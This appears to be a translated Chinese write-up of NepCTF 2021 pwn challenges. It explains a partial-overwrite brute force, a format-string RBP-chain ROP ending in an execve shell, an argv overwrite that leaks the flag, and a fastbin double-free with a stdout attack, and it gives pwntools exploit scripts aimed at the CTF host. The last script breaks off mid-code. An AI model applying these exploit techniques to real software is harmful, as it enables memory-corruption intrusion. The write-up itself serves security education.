# NepCTF2021个人赛Pwn题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## nepCTF [签到] 送你一朵小红花
###  保护
###  分析
  * 通过查看字符串，找到后门函数，由于没有被引用，因此IDA并没有识别出来
  * main函数中有一个很明显的溢出，并且malloc中存放的是函数指针
  * 由于开启了PIE，因此后门函数的地址是未知的
  * 但是malloc中已经有一个在后门函数附近的函数指针了，因此后门函数与已经有的函数指针，只有低2B不同
  * 并且由于4K对齐，低12bit保持不变，因此只需要partial overwrite即可，需啊哟猜测4bit
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context(arch='amd64', os='linux')
    for i in range(2**4):
        try:    
            sh = remote('node2.hackingfor.fun', 32799)
            #gdb.attach(sh, 'break *'+hex(proc_base+0x1721))
            exp = '\x00'*0x10
            exp+= p16(0xE4E1)
            sh.send(exp)
            sh.interactive()
        except:
            continue
## nepCTF easypwn
###  保护
没有PIE，没Canary，只可能事ROP的题了
###  分析
  * 我们的输入都被复制到bss段上面，很明显的，这是为我们写ROP做准备，不然无法直到ret到哪里
  * 整个程序只有一个格式化字符串漏洞，而且只有7B，我们需要利用这个漏洞来开启ROP
**泄露libc**
  * 题目只说了是2.27，但是具体是那个小版本没说，可以先利用格式化字符串泄露libc
  * 栈环境
可以利用保存在栈上的libc_start_main的返回地址去泄露libc的最低12bit
远程打出来发现是2.27 UB1.3
**开启ROP**
  * 7B，只能用类似%xx$hhn的exp，也就是说只够我们任意地址写入一个00的，这时候就用很多种思路了 
    * 打GOT表，让试试能否让函数正好偏移到可利用的位置，失败
    * 打IO结构体，但是未知libc地址，后续也没有scanf，失败
    * 通过%100c在buffer输出很多字符，从而再memcpy中产生栈溢出，但是被snprintf的7B限制住了，失败
    * 利用RBP链表劫持caller保存在栈上的，这个技巧很通用，下面详细说明
**RBP链表与格式化字符串**
  * 从rbp指向的开始，到rsp结束的栈区域称之为一个函数栈帧
  * 当函数A调用函数B时，B需要保证A的函数栈帧不变
  * 因此再进入函数B时有如下指令 
        push rbp        ;保存A的rbp，此时rsp指向栈中A的rbp
    mov rsp, rbp    ;rbp=rsp，此时A的栈底成为B的栈顶，此时rbpA的rbp
    sub rsp, X      ;分配X空间，此时[rbp, rsp]成为B自己的栈帧
    ...            
    leave           ;恢复栈空间， rsp=rbp, pop rbp
    ret             ;返回
  * 我们可以发现一个天然的栈链表： **B的rbp指向保存再栈中A的rbp，  
递推下去，A的rbp也是如此**
  * 观察snprintf时的栈环境，可以很明显的看到一条链表
  * 那么与格式化字符串有什么关系呢？ 
    * 格式化字符串的%N$n参数，需要第N个参数为一个指针才能完成写出
    * 这个rbp链表刚好可以当做我们的参数，而且还不需要我们泄露栈地址，就可以劫持caller()的rbp
  * 假设有`caller1()=>caller2()=>caller3()`的调用链条，再caller3中我们其rbp链表，修改了保存在栈上的caller2()的rbp为X 
    * 当`caller3()`经过 `leave; ret;`返回到caller2()时，caller2()的rbp=X
    * 当`caller2()`经过`leave; ret;`返回到caller1()时，有 
      * leave: 
        * rsp = rbp = X
        * pop rbp，rsp=X+8
      * ret:  
pop rip，从而开启ROP
**ROP**
有了上述思路，本题就很容易了
  * 先格式化字符串修改caller()’s rbp最低字节为00，rbp刚好可以偏移到我们可控的位置，开启ROP
  * 整个ROP链表可以描述为 
    * ROP1： 
      * 劫持rbp为ROP2的地址
      * puts(puts的GOT地址)泄露libc地址
      * 返回到leave; ret，通过栈迁移开启ROP2
    * ROP2： 
      * 劫持rbp为ROP3的地址
      * read(0, ROP3, len)读入新的ROP，因为需要利用上libc泄露的地址
      * 返回到leave; ret，栈迁移开启ROP3
    * ROP3： 
      * syscall调用execve(“/bin/sh”, 0, 0)
      * 要避免使用system，因为system对rsp的对齐有要求，可能会导致意外的SIGV
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    if(len(sys.argv)==1):            #local
        sh = process('./pwn')
        proc_base = sh.libs()[sh.cwd + sh.argv[0].strip('.')]
        gdb.attach(sh, 'break *0x400b7e')
    else:                            #remtoe
        sh = remote('node2.hackingfor.fun', 34092)
    def TeamName(name):
        sh.recvuntil('Please input your teamname: ')
        sh.send(name)
    def NameIntro(name, intro):
        sh.recvuntil('input your name\n')
        sh.send(name)
        sh.recvuntil('input introduction\n')
        sh.send(intro)
    pop_rdi_ret = 0x400be3
    pop_rsi_r15_ret = 0x400be1
    leave_ret = 0x400a1f
    #ROP2 read ROP3 and trigger it
    exp = p64(0x602380)        #rbp
    exp+= p64(pop_rdi_ret)        #read(0, buf, size)
    exp+= p64(0)
    exp+= p64(pop_rsi_r15_ret)
    exp+= p64(0x602380)
    exp+= p64(0)
    exp+= p64(elf.symbols['read'])
    exp+= p64(leave_ret)
    exp = exp.ljust(0x50, 'A')
    TeamName(exp)
    #ROP1, leak libc addr and begin ROP2
    name = "%22$hhn"        #attach rbp list
    Intro = p64(0x6020c0)        #rbp, TeamName addr
    Intro+= p64(pop_rdi_ret)    #puts(@GOT)
    Intro+= p64(elf.got['puts'])
    Intro+= p64(elf.plt['puts'])
    Intro+= p64(leave_ret)        #stack migrate
    Intro+= "/bin/sh\x00"
    Intro = Intro.ljust(0x38, 'A')
    NameIntro(name, Intro)
    sh.recv(4)
    libc.address = u64(sh.recv(6).ljust(8, '\x00')) - libc.symbols['puts']
    Log('libc.address')
    rop = p64(0)            #caller's rbp
    rop+= p64(pop_rdi_ret)        #rdi
    rop+= p64(0x602149)
    rop+= p64(pop_rsi_r15_ret)    #rsi
    rop+= p64(0)
    rop+= p64(0)
    rop+= p64(libc.address+0x1b96)    #rdx
    rop+= p64(0)
    rop+= p64(libc.address+0x43ae8)    #rax
    rop+= p64(59)
    rop+= p64(libc.address+0xd2745)    #syscall
    sleep(1)
    sh.send(rop)
    sh.interactive()
###  环境问题
本地UB18.04的测试中，是刚好差了8B无法开启ROP的，但是再UB16.04中就可以正常进行，所以本地调试时还是要多试试环境
## nepCTF easystack
###  保护
###  分析
  * 先把flag read到bss上
  * Main函数
  * 有一个很明显的栈溢出,但自己实现了一个canary机制
  * 当发现canary被修改过之后,会调用`__stack_chk_fail()`函数
    void __attribute__ ((noreturn)) __stack_chk_fail (void)
    {
      __fortify_fail ("stack smashing detected");
    }
    void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
    {
      /* The loop is added only to keep gcc happy.  */
      while (1)
        __libc_message (2, "*** %s ***: %s terminated\n",
    		    msg, __libc_argv[0] ?: "");
    }
  * 其中__libc_argv定义在libc的bss段,指向栈中的文件名指针argv 
    * __libc_argv => argv => 文件名
  * 因此我们只要栈溢出的够多,覆盖argv,就可完成一个任意读,本题和2018网鼎杯 GUESS 很像,就不多说了
### EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    sh = remote('node2.hackingfor.fun', 31255)
    #gdb.attach(sh, 'break *0x400A8E')
    sleep(1)
    exp = 'A'*0x1c8
    exp+= p64(0x6CDE20)
    #sh.recvuntil('give me your answer!!\n')
    sh.sendline(exp)
    sh.interactive()
## nepCTF sooooeasy
###  保护
###  程序分析
  * 结构体 
        struct Note{
      bool in_use;
      char* name;
      char msg[0x18];
    };
    sizeof(Note)=0x28
  * Add 
    * 只能使用0xF次
    * 分配Note并清空 
      * note = malloc(struct Note);
      * memset(note, 0, 0x28)
    * 分配任意大小的name并进行写入 
      * 读入任意大小的size
      * tmp = malloc(sz),
      * read(0, tmp, sz);
      * note->name=tmp
    * 读入0x17长的msg 
      * scanf(“%23s”, &note->msg)
    * note->in_use = 1
    * 记录写入到PtrArr中 
      * PtrArr[idx] = note
  * Delete 
    * 读入idx：0in_use = 0
    * free(PtrArr[idx]->name)
###  思路
**泄露libc版本**
  * Delete之后没有设置为null，造成double free
  * 堆题libc都很重要,题目没给libc，先用double free测一下 
    * 如果报fastbin double free 那就是2.23~2.26 
      * 2.23下会检查free的fastbin chunk是不是fastbin链表中的第一个chunk
    * 如果没报错那就是2.27~2.28 
      * 因为有tcahce,2.27的tcache没有任何检查
    * 如果报tcache double free那么就是2.29及其以上 
      * 因为2.29以后tcache增加了key字段防止tcache double free
不仅知道了是2.23还可以直接更绝低12bit确定libc的小版本
**getshell思路**
  * 2.23下直接fastbin double free,通过隔块释放的方法绕过检查
  * fastbin attack的要点就在于要伪造size
  * 没开seccomp因此可以利用__malloc_hook前面的0x7F,去伪造一个0x70的大小
  * 思路清晰了，直接fastbin double free打malloc hook+OGG，可能要realloc调整栈
  * 顺便说一句:如果是要打__free_hook,附近没有0x7F怎么办呢? 
    * malloc_state前面有0x7F,可以利用这个0x7F打malloc_state控制top chunk指针,不断申请让top chunk最终分配到__free_hook
    * 还是打malloc_state,但这次控制fastbin数组,利用fastbin jump手法,一边伪造size一边分配,这个手法没什么文章说,我后面可能会再发一篇细说
**泄露libc思路**
  * 题目没给show功能,因此我们只能通过UB的fd指针构造一个stdout指针,然后打IO 
    * 先得到一个UBchunk,分配到后partial overwrite残留的fd指针,得到指向stdout附近的的指针 
      * `UBchunk->FC_near_stdout`
      * 不能直接指向stdout,要指向stdout前面的0x7F来伪造size
    * 构造一个double free 
      * `Fastbin->AB`
      * 为了绕过检查,A,B,UBchunk的size都一样
    * 分配Fastbin得到A,partial overwrite残留的堆指针,使其指向UBchunk 
      * `fastbin->B->A->UBchunk->FC_near_stdout`
    * 接下来不断分配就可达到stdout
  * 打stdout的手法: 
    * 当控制`stdout->_flag =0xFBAD180`0后
    * 输出时会打印`[stdout->_IO_write_base, stdout->_IO_write_ptr)`之间的内容
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    #context.log_level = 'debug'
    context(arch='amd64', os='linux')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    for i in range(100):
        try:
            sh = remote('node2.hackingfor.fun', 38018)
            def Cmd(n):
                sh.recvuntil('Your choice : ')
                sh.send(str(n).ljust(8, '\x00'))